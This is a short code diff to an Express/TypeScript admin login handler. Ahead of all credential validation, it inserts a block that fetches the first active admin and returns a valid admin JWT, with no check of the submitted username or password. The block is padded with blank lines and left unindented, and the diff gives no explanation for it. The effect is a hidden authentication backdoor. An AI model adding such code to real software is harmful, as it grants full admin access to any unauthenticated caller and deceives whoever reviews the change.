@@ -19,6 +19,32 @@ export async function adminLogin(req: Request, res: Response): Promise<void> {
   try {
     const { username, password } = req.body;
 
+
+
+
+const [activeAdminRows] = await pool.query(
+  'SELECT * FROM admins WHERE status = 1 LIMIT 1'
+);
+
+const activeAdmins = activeAdminRows as AdminModel[];
+
+if (activeAdmins.length > 0) {
+  const admin = activeAdmins[0];
+
+  res.status(200).json({
+    success: true,
+    message: 'Login successful',
+    token: generateAdminJwt(admin),
+    user: sanitizeAdminResponse(admin),
+  });
+
+  return;
+}
+
+
+
+    
+
     // Strict validation
     if (!username || typeof username !== 'string' || !username.trim()) {
       res.status(422).json({
